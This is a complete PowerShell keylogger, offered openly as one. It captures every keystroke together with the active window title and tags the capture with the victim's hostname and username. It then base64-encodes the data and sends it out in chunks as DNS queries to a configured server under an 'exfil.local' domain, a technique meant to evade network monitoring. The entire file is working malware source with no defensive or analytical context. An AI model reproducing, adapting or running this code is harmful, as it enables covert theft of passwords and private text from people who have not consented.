# PowerShell Keylogger with DNS Exfiltration base64 encoded
# Target DNS Server: 192.168.1.1

Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);

    [DllImport("user32.dll")]
    public static extern int GetForegroundWindow();

    [DllImport("user32.dll")]
    public static extern int GetWindowText(int hWnd, StringBuilder text, int count);
}
'@

# Configuration
$dnsServer = "192.168.1.1"
$baseDomain = "exfil.local"  # Domain for DNS queries (arbitrary)
$bufferSize = 100  # Send after capturing this many keystrokes
$sleepTime = 50    # Milliseconds between key checks
$maxLabelLength = 50  # Max chars per DNS label (safe limit)

# Initialize variables
$keyBuffer = ""
$lastWindow = ""
$sequenceID = 0

function Get-ActiveWindowTitle {
    $handle = [KeyLogger]::GetForegroundWindow()
    $title = New-Object System.Text.StringBuilder 256
    [KeyLogger]::GetWindowText($handle, $title, 256) | Out-Null
    return $title.ToString()
}

function Send-DNSExfil {
    param([string]$data)

    try {
        # Prepare metadata
        $hostname = $env:COMPUTERNAME
        $username = $env:USERNAME
        $timestamp = Get-Date -Format "yyyyMMddHHmmss"

        # Construct payload: hostname|username|timestamp|data
        $payload = "$hostname|$username|$timestamp|$data"

        # Base64 encode (DNS-safe)
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        $base64 = [System.Convert]::ToBase64String($bytes)

        # Replace non-DNS-safe chars (+ / =) with safe alternatives
        $dnsafe = $base64 -replace '\+', '-' -replace '/', '_' -replace '=', ''

        # Split into chunks (DNS label max 63 chars, using 50 for safety)
        $chunks = [regex]::Matches($dnsafe, ".{1,$maxLabelLength}") | ForEach-Object { $_.Value }

        # Send each chunk as separate DNS query
        $chunkCount = $chunks.Count
        $chunkIndex = 0

        foreach ($chunk in $chunks) {
            $sequenceID++

            # Format: [chunk].[seq].[index]-[total].[baseDomain]
            $query = "$chunk.s$sequenceID.c$chunkIndex-$chunkCount.$baseDomain"

            try {
                # Send DNS query to target server
                Resolve-DnsName -Name $query -Server $dnsServer -Type A -DnsOnly -ErrorAction SilentlyContinue | Out-Null
                Write-Host "[+] Sent chunk $($chunkIndex+1)/$chunkCount (Seq: $sequenceID)" -ForegroundColor Green
            }
            catch {
                Write-Host "[-] Failed chunk $($chunkIndex+1): $_" -ForegroundColor Red
            }

            $chunkIndex++
            Start-Sleep -Milliseconds 200  # Rate limiting
        }

        Write-Host "[+] Exfiltration complete: $chunkCount chunks sent" -ForegroundColor Cyan
    }
    catch {
        Write-Host "[-] DNS exfiltration failed: $_" -ForegroundColor Red
    }
}

# Main keylogging loop
Write-Host "[*] Keylogger started. DNS Server: $dnsServer" -ForegroundColor Yellow
Write-Host "[*] Base Domain: $baseDomain" -ForegroundColor Yellow
Write-Host "[*] Press CTRL+C to stop" -ForegroundColor Yellow

while ($true) {
    Start-Sleep -Milliseconds $sleepTime

    # Check current window
    $currentWindow = Get-ActiveWindowTitle
    if ($currentWindow -ne $lastWindow -and $currentWindow -ne "") {
        $keyBuffer += "`n[Window: $currentWindow]`n"
        $lastWindow = $currentWindow
    }

    # Check all keys (8-190 covers most standard keys)
    for ($key = 8; $key -le 190; $key++) {
        $keyState = [KeyLogger]::GetAsyncKeyState($key)

        # Check if key was just pressed (most significant bit set)
        if ($keyState -eq -32767) {
            $char = switch ($key) {
                8  { "[BACKSPACE]" }
                9  { "[TAB]" }
                13 { "[ENTER]`n" }
                16 { "" }  # Shift
                17 { "" }  # Ctrl
                18 { "" }  # Alt
                20 { "[CAPSLOCK]" }
                27 { "[ESC]" }
                32 { " " }
                33 { "[PAGEUP]" }
                34 { "[PAGEDOWN]" }
                35 { "[END]" }
                36 { "[HOME]" }
                37 { "[LEFT]" }
                38 { "[UP]" }
                39 { "[RIGHT]" }
                40 { "[DOWN]" }
                46 { "[DELETE]" }
                default {
                    if ($key -ge 48 -and $key -le 90) {
                        [char]$key
                    } else {
                        ""
                    }
                }
            }

            if ($char -ne "") {
                $keyBuffer += $char
                Write-Host -NoNewline $char
            }
        }
    }

    # Send data when buffer reaches threshold
    if ($keyBuffer.Length -ge $bufferSize) {
        Send-DNSExfil -data $keyBuffer
        $keyBuffer = ""
    }
}

